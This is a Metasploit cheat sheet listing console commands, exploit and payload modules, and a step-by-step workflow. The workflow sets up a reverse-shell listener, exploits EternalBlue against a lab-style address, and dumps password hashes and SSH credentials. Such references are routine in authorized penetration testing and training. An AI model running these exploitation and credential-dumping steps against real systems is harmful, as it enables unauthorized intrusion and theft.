# Metasploit Cheat Sheet

## msfconsole Commands
| Command | Description |
|---------|-------------|
| `msfconsole -q` | Launch console (quiet) |
| `help` | Show help |
| `help command` | Specific command help |
| `use module_path` | Select module |
| `show options` | Module options |
| `show advanced` | Advanced options |
| `show targets` | Compatible targets |
| `set opt value` | Set option |
| `setg opt value` | Set global option |
| `unset opt` | Unset option |
| `run` / `exploit` | Execute module |
| `check` | Check if target is vulnerable |
| `back` | Leave current module |
| `search keyword` | Search modules |
| `info module` | Module details |
| `reload_all` | Reload all modules |
| `sessions -l` | List sessions |
| `sessions -i ID` | Interact with session |
| `sessions -k ID` | Kill session |
| `sessions -u ID` | Upgrade shell to meterpreter |
| `jobs -l` | List background jobs |
| `jobs -k ID` | Kill job |
| `spawn_shell` | Spawn new shell |
| `connect IP port` | Netcat-like connect |
| `resource script.rc` | Run resource script |
| `makerc file.rc` | Save commands to script |
| `save` | Save datastore |
| `set console logging on` | Log all output |

## Module Paths
| Path | Description |
|------|-------------|
| `auxiliary/scanner/` | Discovery and scanning |
| `/portscan/tcp` | TCP port scan |
| `/portscan/syn` | SYN scan |
| `/smb/smb_version` | SMB version scan |
| `/ssh/ssh_version` | SSH version scan |
| `/http/http_version` | HTTP version scan |
| `exploit/` | Exploit modules |
| `/multi/handler` | Generic payload handler |
| `/windows/smb/ms17_010_eternalblue` | EternalBlue |
| `/linux/http/xxx` | Linux web exploit |
| `payload/` | Payloads |
| `/windows/meterpreter/reverse_tcp` | Win meterpreter |
| `/linux/x64/meterpreter/reverse_tcp` | Linux meterpreter |
| `/windows/shell/reverse_tcp` | Windows reverse shell |
| `/linux/x86/shell_reverse_tcp` | Linux reverse shell |
| `post/` | Post-exploitation |
| `/windows/gather/enum_applications` | Enumerate apps |
| `/linux/gather/hashdump` | Dump hashes |
| `/multi/gather/ssh_creds` | Gather SSH creds |

## Payloads
| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Staged win meterpreter |
| `windows/meterpreter_reverse_tcp` | Stageless win meterpreter |
| `linux/x64/meterpreter/reverse_tcp` | Staged linux meterpreter |
| `linux/x64/shell/reverse_tcp` | Staged linux shell |
| `linux/x86/shell_reverse_tcp` | Stageless linux shell |
| `php/meterpreter_reverse_tcp` | PHP meterpreter |
| `python/meterpreter_reverse_tcp` | Python meterpreter |
| `java/meterpreter/reverse_tcp` | Java meterpreter |
| `cmd/unix/reverse_bash` | Unix bash reverse |

## Exploit Workflow
```bash
# 1. Search
search ms17_010
search type:exploit platform:windows cve:2021
search ftp type:auxiliary

# 2. Configure listener
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run -j  # Run as job

# 3. Run exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
check
exploit

# 4. Upgrade shell
sessions -u 1

# 5. Interact
sessions -i 1
```

## Post-Exploitation
```bash
# Run a post module from session
use post/linux/gather/hashdump
set SESSION 1
run

# Built-in commands (meterpreter)
getuid
sysinfo
hashdump
background
```

## Database Integration
| Command | Description |
|---------|-------------|
| `db_status` | Check DB connection |
| `db_nmap -sV 10.10.10.0/24` | Run nmap, store results |
| `hosts` | List discovered hosts |
| `services` | List services |
| `vulns` | List vulnerabilities |
| `creds` | List credentials |
| `notes` | View notes |
| `loot` | View acquired loot |
| `db_import file.xml` | Import nmap XML |

## Resource Scripts
```bash
# Automate with resource script
cat > auto.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF

# Run it
msfconsole -r auto.rc
```
